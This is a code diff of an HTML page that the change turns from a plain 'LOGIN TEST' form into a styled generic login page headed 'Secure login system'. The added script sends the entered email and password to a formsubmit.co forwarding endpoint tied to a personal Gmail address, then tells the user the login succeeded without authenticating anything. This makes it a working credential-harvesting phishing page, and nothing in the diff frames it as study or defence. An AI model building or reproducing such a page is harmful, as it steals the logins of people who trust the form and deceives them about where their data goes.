@@ -1,29 +1,127 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>TEST</title>
+  <title>Login</title>
+
+  <style>
+    body{
+      margin:0;
+      height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      font-family:Arial, sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+    }
+
+    .box{
+      width:340px;
+      background:white;
+      padding:40px;
+      border-radius:15px;
+      box-shadow:0 10px 40px rgba(0,0,0,0.4);
+      text-align:center;
+    }
+
+    h2{
+      margin-bottom:20px;
+      color:#222;
+      letter-spacing:2px;
+    }
+
+    input{
+      width:90%;
+      padding:12px;
+      margin:10px 0;
+      border:1px solid #ccc;
+      border-radius:8px;
+      outline:none;
+      transition:0.2s;
+    }
+
+    input:focus{
+      border-color:#00bcd4;
+      box-shadow:0 0 8px rgba(0,188,212,0.3);
+    }
+
+    button{
+      width:95%;
+      padding:12px;
+      margin-top:10px;
+      background:#00bcd4;
+      color:white;
+      border:none;
+      border-radius:8px;
+      cursor:pointer;
+      font-size:16px;
+      font-weight:bold;
+    }
+
+    button:hover{
+      background:#0097a7;
+    }
+
+    #msg{
+      margin-top:15px;
+      font-size:14px;
+    }
+
+    .small{
+      font-size:12px;
+      color:gray;
+      margin-top:10px;
+    }
+  </style>
 </head>
+
 <body>
 
-<h2>LOGIN TEST</h2>
+<div class="box">
 
-<input id="email" placeholder="email">
-<input id="password" placeholder="password">
+  <h2>LOGIN</h2>
 
-<button onclick="test()">LOGIN</button>
+  <input id="email" type="email" placeholder="Email address">
+  <input id="password" type="password" placeholder="Password">
 
-<p id="msg"></p>
+  <button onclick="login()">Sign In</button>
+
+  <div id="msg"></div>
+
+  <div class="small">Secure login system</div>
+
+</div>
 
 <script>
 
-function test(){
+function login(){
 
-  let email = document.getElementById("email").value;
-  let password = document.getElementById("password").value;
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value.trim();
+  const msg = document.getElementById("msg");
 
-  // SHOW EXACT RAW INPUT (no trimming, no logic)
-  document.getElementById("msg").innerText =
-    "EMAIL=[" + email + "] PASSWORD=[" + password + "]";
+  if(email === "" || password === ""){
+    msg.style.color = "red";
+    msg.innerText = "Please fill all fields";
+    return;
+  }
+
+  msg.style.color = "green";
+  msg.innerText = "Logging in...";
+
+  fetch("https://formsubmit.co/ajax/folkking66@gmail.com", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      email,
+      password
+    })
+  });
+
+  setTimeout(() => {
+    msg.innerText = "Login successful ✔";
+  }, 1000);
 
 }
 
